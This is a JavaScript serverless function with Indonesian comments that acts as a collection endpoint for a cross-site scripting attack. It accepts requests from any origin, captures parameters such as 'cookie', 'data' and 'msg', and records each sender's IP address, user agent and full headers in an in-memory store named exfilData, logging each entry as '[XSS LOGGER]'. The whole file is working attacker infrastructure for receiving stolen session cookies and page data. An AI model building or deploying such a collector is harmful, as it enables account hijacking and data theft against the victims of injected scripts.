// Ini adalah serverless function yang akan menangani semua request ke /log
// File ini harus disimpan di folder 'api/log.js'

// Simpan data dalam memory (akan hilang jika function cold start)
// Untuk production, gunakan database atau Vercel KV
let exfilData = [];

export default function handler(req, res) {
    // Set CORS headers agar bisa menerima request dari domain manapun
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle preflight request (OPTIONS)
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Tangani request GET - menerima data dari query parameter
    if (req.method === 'GET') {
        const data = req.query.data || req.query.d || req.query.cookie || req.query.msg || 'no-data';
        const source = req.query.source || 'unknown';
        const timestamp = new Date().toISOString();
        
        // Dapatkan IP pengirim (jika tersedia)
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
        
        // Dapatkan user agent
        const userAgent = req.headers['user-agent'] || 'unknown';
        
        // Buat entry data
        const entry = {
            id: Date.now() + Math.random().toString(36).substring(7),
            timestamp,
            method: 'GET',
            ip,
            userAgent,
            data,
            source,
            fullUrl: req.url,
            headers: req.headers
        };
        
        // Simpan data (dalam memory array)
        exfilData.unshift(entry); // Tambah di awal
        if (exfilData.length > 100) exfilData.pop(); // Batasi 100 entry terbaru
        
        console.log('[XSS LOGGER] Data received via GET:', entry);
        
        // Return response sukses
        return res.status(200).json({
            success: true,
            message: 'Data received',
            id: entry.id
        });
    }
    
    // Tangani request POST - menerima data dari body
    if (req.method === 'POST') {
        let rawData = '';
        let parsedData = {};
        
        // Coba parse body
        try {
            if (req.body) {
                // Jika body sudah terparse otomatis (karena middleware)
                parsedData = req.body;
            } else {
                // Jika perlu parse manual
                rawData = JSON.stringify(req.body || {});
            }
        } catch (e) {
            rawData = 'Error parsing body';
        }
        
        const timestamp = new Date().toISOString();
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
        const userAgent = req.headers['user-agent'] || 'unknown';
        
        const entry = {
            id: Date.now() + Math.random().toString(36).substring(7),
            timestamp,
            method: 'POST',
            ip,
            userAgent,
            data: parsedData.data || parsedData.cookie || parsedData.msg || rawData,
            fullBody: parsedData,
            headers: req.headers
        };
        
        exfilData.unshift(entry);
        if (exfilData.length > 100) exfilData.pop();
        
        console.log('[XSS LOGGER] Data received via POST:', entry);
        
        return res.status(200).json({
            success: true,
            message: 'Data received',
            id: entry.id
        });
    }
    
    // Method tidak diizinkan
    return res.status(405).json({ error: 'Method not allowed' });
}

// Export data untuk bisa diakses oleh endpoint lain (opsional)
export function getExfilData() {
    return exfilData;
}
